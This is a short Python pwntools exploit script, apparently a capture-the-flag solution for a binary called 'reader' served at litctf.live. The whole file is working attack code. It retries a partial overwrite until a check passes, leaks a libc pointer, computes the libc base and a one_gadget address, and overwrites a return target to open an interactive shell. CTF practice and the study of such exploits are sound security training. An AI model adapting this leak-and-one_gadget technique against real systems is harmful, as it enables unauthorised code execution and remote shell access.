from pwn import *

for i in range(1,100):
    r = remote("litctf.live" ,31789)
    #r = process("./reader")
    e = ELF("./reader")
    libc  = ELF("./libc-2.31.so")
    r.sendlineafter('How much do you want read today?\n' ,"0")
    r.sendlineafter('What would you like to do?\n' ,"1")
    exploit = b"A" * 24 + b"B" * 8 + p8(0x0) 
    r.sendafter("Input what you'd like to have read:\n" ,exploit)
    r.sendlineafter('What would you like to do?\n' ,"2")
    r.recvuntil(b"Here's what I've read:\n")
    cmp = r.recvuntil(b"\n\n")
    if(cmp == b'AAAAAAAAAAAAAAAAAAAAAAAABBBB\x02\n\n'):
        r.sendlineafter('What would you like to do?\n' ,"1")
        exploit = b"A" * 32 + p8(0x38)
        r.sendafter("Input what you'd like to have read:\n" ,exploit)
        r.sendlineafter('What would you like to do?\n' ,"2")
        r.recvuntil(b"Here's what I've read:\n")
        libc_leak = r.recvuntil(b"\x7f")
        libc_leak = libc_leak + b"\x00" * 2 
        libc_leak = u64(libc_leak)
        libc_base = libc_leak - 0x270b3
        one_gadget = libc_base + 0xe6af1
        r.sendlineafter('What would you like to do?\n' ,"1")
        r.sendafter("Input what you'd like to have read:\n" ,p64(one_gadget))
        r.sendlineafter('What would you like to do?\n' ,"3")
        r.interactive()
        break
    else:
        print("NOOOOO")
        r.close()
